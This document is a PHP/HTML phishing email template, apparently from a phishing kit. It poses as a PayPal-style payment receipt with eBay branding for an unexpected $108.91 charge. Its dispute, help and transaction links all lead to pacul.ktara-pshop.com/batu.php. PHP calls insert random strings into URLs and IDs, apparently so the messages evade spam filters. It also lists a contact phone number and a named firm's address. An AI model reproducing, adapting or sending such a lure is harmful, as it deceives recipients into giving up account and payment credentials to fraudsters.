<?php 
include('generate.php');
$abc = new Revan;
?>
<div style="display: none;"> </div>
<div style="display: none;"> </div>
<div>
<div style="font-family: 'wf_segoe-ui_normal','Segoe UI','Segoe WP',Tahoma,Arial,sans-serif,serif,'EmojiFont';">
<div>
<div>
<div style="padding: 0; margin: 0; background: #f2f2f2;">
<table border="0" width="100%" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td style="font-size: 0px;" bgcolor="#f2f2f2"> </td>
<td align="center" bgcolor="#ffffff" width="660">
<table border="0" width="100%" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td align="center" valign="top" width="600">
<table border="0" width="100%" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td style="padding-top: 10px;" bgcolor="#f2f2f2"> </td>
</tr>
<tr>
<td style="padding-top: 10px;" bgcolor="#f2f2f2"> </td>
</tr>
<tr>
<td align="center" valign="top" bgcolor="#ffffff">
<table style="margin-bottom: 10px;" border="0" width="100%" cellspacing="0" cellpadding="0">
<tbody>
<tr valign="bottom">
<td align="center" valign="top" width="20"> </td>
<td align="left" height="64"><img style="width: 200px; height: 46px;" src="http://pacul.ktara-pshop.com/img/_logo.gif?<?php echo $abc->random_text('textrandom', 5) ?>=<?php echo $abc->random_text('textrandom', 16) ?>" alt="payment.invoice-alert.com" width="113" height="46" border="0" /></td>
<td align="center" valign="top" width="40"> </td>
<td align="right"><span style="font-family: Calibri,Trebuchet,Arial,sans serif,serif,'EmojiFont';"> <span style="display: inline;"><span style="display: inline;"><br /> Transaction ID: <a style="text-decoration: none;" href="http://pacul.ktara-pshop.com/batu.php" target="_blank" rel="noopener noreferrer"><?php echo $abc->random_text('textrandom', 16) ?> </a></span></span></span></td>
<td align="center" valign="top" width="20"> </td>
</tr>
</tbody>
</table>
<table style="padding-bottom: 10px; padding-top: 10px; margin-bottom: 20px;" border="0" width="100%" cellspacing="0" cellpadding="0">
<tbody>
<tr valign="bottom">
<td align="center" valign="top" width="20"> </td>
<td style="font-family: Calibri,Trebuchet,Arial,sans serif; font-size: 15px; line-height: 22px; color: #333333;" valign="top">
<div style="margin-top: 30px; color: #333333 !important; font-family: arial,helvetica,sans-serif,serif,'EmojiFont'; font-size: 12px;"><span style="color: #333333 !important; font-weight: bold; font-family: arial,helvetica,sans-serif,serif,'EmojiFont';">Hello Customer ,</span><br /> <br />
<p style="font-size: 14px; color: #c88039; font-weight: bold; text-decoration: none;">You sent a payment of $108.91 USD to billing@partcompi.com</p>
<table cellpadding="5">
<tbody>
<tr>
<td valign="top">
<p>We've asked the seller to ship.</p>
<p>Thanks for using <span style="font-family: Calibri,Trebuchet,Arial,sans serif,serif,'EmojiFont';" tabindex="0">Express checkout</span>. To see all the transaction details, log in to your <span style="font-family: Calibri,Trebuchet,Arial,sans serif,serif,'EmojiFont';" tabindex="0"></span> account.</p>
</td>
<td> </td>
</tr>
</tbody>
</table>
<div style="margin-top: 5px; clear: both;">
<p>It may take a few moments for this transaction to appear in your account.</p>
</div>
<div style="margin-top: 5px; clear: both;">
<div><br />
<table style="border-top: 1px solid #ccc; color: #333333!important; font-family: arial,helvetica,sans-serif; font-size: 12px; clear: both; width: 100%;" cellspacing="3" cellpadding="3">
<tbody>
<tr>
<td>
<table border="0" width="100%" cellspacing="0" cellpadding="10px;">
<tbody>
<tr>
<td style="padding-top: 5px; padding-right: 10px;" valign="top" width="50%"><span style="display: inline; font-family: Calibri,Trebuchet,Arial,sans serif,serif,'EmojiFont';"><span style="color: #333333; font-weight: bold;">Seller</span></span><br /> <span style="display: inline; font-family: Calibri,Trebuchet,Arial,sans serif,serif,'EmojiFont';">PartCompi ,INC</span></td>
<td style="padding-top: 5px;" valign="top" width="50%"><span style="color: #333333; font-weight: bold; font-family: Calibri,Trebuchet,Arial,sans serif,serif,'EmojiFont';">Note to seller</span><br /> <span style="display: inline; font-family: Calibri,Trebuchet,Arial,sans serif,serif,'EmojiFont';">You haven't included a note.</span></td>
</tr>
<tr>
<td style="padding-top: 10px;" valign="top" width="50%"><span style="display: inline; font-family: Calibri,Trebuchet,Arial,sans serif,serif,'EmojiFont';"><span style="color: #333333; font-weight: bold;">Shipping address -</span><span style="color: #4c8f3a;"> unconfirmed</span><br /> <span style="display: inline;">de Ybarrondo Law Firm PLLC<br /></span><span style="display: inline;">6632 Brompton Rd.<br /></span><span style="display: inline;">Houston<span style="display: inline;">,</span></span><span style="display: inline;">TX</span><span style="display: inline;">77005<br /></span><span style="display: inline;">United States<br /></span></span></td>
<td style="padding-top: 10px;" valign="top" width="50%"><span style="display: inline; font-family: Calibri,Trebuchet,Arial,sans serif,serif,'EmojiFont';"><span style="color: #333333; font-weight: bold;">Shipping details</span><br /> <span style="display: inline;">The seller hasn’t provided any shipping details yet. </span></span></td>
</tr>
</tbody>
</table>
<br />
<div style="font-family: Calibri,Trebuchet,Arial,sans serif,serif,'EmojiFont';"> </div>
<span style="display: inline; font-family: Calibri,Trebuchet,Arial,sans serif,serif,'EmojiFont';"><span style="display: inline; font-family: Calibri,Trebuchet,Arial,sans serif,serif,'EmojiFont';"><span style="display: inline;"><br /></span></span></span>
<div> </div>
<div> </div>
<table style="clear: both; color: #333!important; font-size: 12px; font-family: arial,helvetica,sans-serif;" border="0" width="100%" cellspacing="0" cellpadding="0" align="center">
<tbody>
<tr>
<td style="border: 1px solid #ccc; border-right: none; border-left: none; padding: 5px 10px 5px 10px!important; color: #333333;" width="50%">Description</td>
<td style="border: 1px solid #ccc; border-right: none; border-left: none; padding: 5px 10px 5px 10px!important; color: #333333;" align="right" width="20%">Unit price</td>
<td style="border: 1px solid #ccc; border-right: none; border-left: none; padding: 5px 10px 5px 10px!important; color: #333333;" align="right" width="10%">Qty</td>
<td style="border: 1px solid #ccc; border-right: none; border-left: none; padding: 5px 10px 5px 10px!important; color: #333333;" align="right" width="20%">Amount</td>
</tr>
<tr>
<td style="border-bottom: 1px solid #ccc; padding: 10px;" valign="top"><a style="text-decoration: none;" href="http://pacul.ktara-pshop.com/batu.php" target="_blank" rel="noopener noreferrer" type="Link">Black Suits Europe XXL</a><br /> <span style="display: inline; font-family: Calibri,Trebuchet,Arial,sans serif,serif,'EmojiFont';"><span style="display: inline;">Item#</span>272837732484 </span></td>
<td style="border-bottom: 1px solid #ccc; padding: 10px;" align="right" valign="top">$108.91 USD</td>
<td style="border-bottom: 1px solid #ccc; padding: 10px;" align="right" valign="top">1</td>
<td style="border-bottom: 1px solid #ccc; padding: 10px;" align="right" valign="top">$108.91 USD</td>
</tr>
</tbody>
</table>
<table style="clear: both; border-top: 1px solid #ccc; border-bottom: 1px solid #ccc; margin: 0 0 10px 0;" border="0" width="100%" cellspacing="0" cellpadding="0" align="center">
<tbody>
<tr>
<td style="padding: 10px 0 0 10px;" valign="top"><img style="margin-top: 10px;" src="http://pacul.ktara-pshop.com/img/logo_ebay_62x26.gif?<?php echo $abc->random_text('textrandom', 5) ?>=<?php echo $abc->random_text('textrandom', 16) ?>" alt="" /></td>
<td>
<table style="clear: both; color: #333333!important; font-family: arial,helvetica,sans-serif; font-size: 12px; margin: 10px 0 0 10px;" border="0" width="100%" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td style="width: 75%; text-align: right; padding: 0 10px 0 0;"><span style="display: inline; font-family: Calibri,Trebuchet,Arial,sans serif,serif,'EmojiFont';">Shipping and handling</span></td>
<td style="width: 25%; text-align: right; padding: 0 20px 0 0;" align="right"><span style="display: inline; font-family: Calibri,Trebuchet,Arial,sans serif,serif,'EmojiFont';">$0.00 USD</span></td>
</tr>
<tr>
<td style="width: 75%; text-align: right; padding: 0 10px 0 0;">Insurance - <span style="display: inline; font-family: Calibri,Trebuchet,Arial,sans serif,serif,'EmojiFont';">not offered</span></td>
<td style="width: 25%; text-align: right; padding: 0 20px 0 0;"><span style="display: inline; font-family: Calibri,Trebuchet,Arial,sans serif,serif,'EmojiFont';"><span>----</span></span></td>
</tr>
<tr>
<td style="width: 75%; text-align: right; padding: 0 10px 0 0;"><span style="color: #333333 !important; font-weight: bold; font-family: Calibri,Trebuchet,Arial,sans serif,serif,'EmojiFont';">Total</span></td>
<td style="width: 25%; text-align: right; padding: 0 20px 0 0;">$108.91 USD</td>
</tr>
<tr>
<td style="width: 75%; text-align: right; padding: 20px 10px 0 0;"><span style="color: #333333 !important; font-weight: bold; font-family: Calibri,Trebuchet,Arial,sans serif,serif,'EmojiFont';">Payment</span></td>
<td style="width: 25%; color: #333; text-align: right; padding: 20px 20px 0 0;"><span style="display: inline; font-family: Calibri,Trebuchet,Arial,sans serif,serif,'EmojiFont';">$108.91 USD</span></td>
</tr>
<tr>
<td style="width: 100%; text-align: right; padding: 10px 20px 0 0;" colspan="2"><span style="display: inline; font-family: Calibri,Trebuchet,Arial,sans serif,serif,'EmojiFont';">This charge will appear on your credit card statement as "<span tabindex="0"></span> *BlackSuitsEu<?php echo rand(0,100) ?>" <br /></span>Payment sent to billing@partcompi.com</td>
</tr>
<tr>
<td style="height: 10px;" colspan="2"> </td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</div>
<span style="display: inline;"><span style="font-weight: bold; color: #333333;">Issues with this transaction? click bellow</span><br /> <a style="background: #ffa822; margin: 0; padding: 1px 10px; border: 1px solid #bfbfbf; border-right-color: #908d8d; border-bottom-color: #908d8d;">http://pacul.ktara-pshop.com/batu.php?<?php echo $abc->random_text('textrandom',3) ?>=<?php echo $abc->random_text('textrandom',6) ?></a><br /> <span style="display: inline;">You have 180 days from the date of the transaction to open a dispute in the Resolution Center.</span><br /> <br /></span><img style="margin-right: 5px; vertical-align: middle;" src="http://pacul.ktara-pshop.com/img/icon_help_16x16.gif?<?php echo $abc->random_text('textrandom', 5) ?>=<?php echo $abc->random_text('textrandom', 16) ?>" alt="" />Questions? Go to the Help Center at: http://pacul.ktara-pshop.com/batu.php?<?php echo $abc->random_text('textrandom',3) ?>=<?php echo $abc->random_text('textrandom',6) ?>/help.<span style="display: inline;"><span style="display: inline;"><br /> For assistance with matters regarding your <span tabindex="0">transaction</span> account not identified above, please contact us toll free at 1-888-221-1161.</span></span><br /> <br /> <br /> <span style="font-size: 11px; color: #333333;">Please do not reply to this email. This mailbox is not monitored and you will not receive a response. For assistance, log in to your <span tabindex="0"></span> account and click <strong>Help</strong> in the top right corner of any <span tabindex="0">transaction</span> page.</span><br /> <br /> <span style="font-size: 11px; color: #333333;">You can receive plain text emails instead of HTML emails. To change your Notifications preferences, log in to your account, go to your Profile, and click <strong>My settings</strong>.</span></div>
</div>
</td>
<td align="center" valign="top" width="20"> </td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
<table border="0" width="100%" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td align="center" valign="top" width="600">
<table border="0" width="100%" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td style="padding-top: 20px;" bgcolor="#f2f2f2"> </td>
</tr>
<tr>
<td align="center" valign="top" bgcolor="#f2f2f2">
<table border="0" width="100%" cellspacing="0" cellpadding="0">
<tbody>
<tr valign="bottom">
<td>
<table border="0" cellspacing="0" cellpadding="0" align="left">
<tbody>
<tr>
<td style="font-family: Calibri,Trebuchet,Arial,sans serif; font-size: 13px; color: #666; font-weight: bold;"> </td>
</tr>
</tbody>
</table>
</td>
<td align="center" valign="top" width="20"> </td>
</tr>
</tbody>
</table>
<table border="0" width="100%" cellspacing="0" cellpadding="0">
<tbody>
<tr valign="bottom">
<td align="center" valign="top" width="20"> </td>
<td>
<table style="padding-top: 20px; font: 12px Arial,Verdana,Helvetica,sans-serif; color: #292929;" border="0" width="100%" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td>
<p>Copyright © 1999-2017 <span style="font-family: Calibri,Trebuchet,Arial,sans serif,serif,'EmojiFont';" tabindex="0">Payment Processor</span>, Inc. All rights reserved.</p>
<p><span style="font-family: Calibri,Trebuchet,Arial,sans serif,serif,'EmojiFont';" tabindex="0">Email ID:</span> PPX000601:<?php echo $abc->random_text('textrandom', 22) ?> 	</p>
</td>
</tr>
</tbody>
</table>
</td>
<td align="center" valign="top" width="20"> </td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</td>
<td style="font-size: 0px;" bgcolor="#f2f2f2"> </td>
</tr>
</tbody>
</table>
</div>
</div>
</div>
</div>
<div style="display: none;"> </div>
</div>
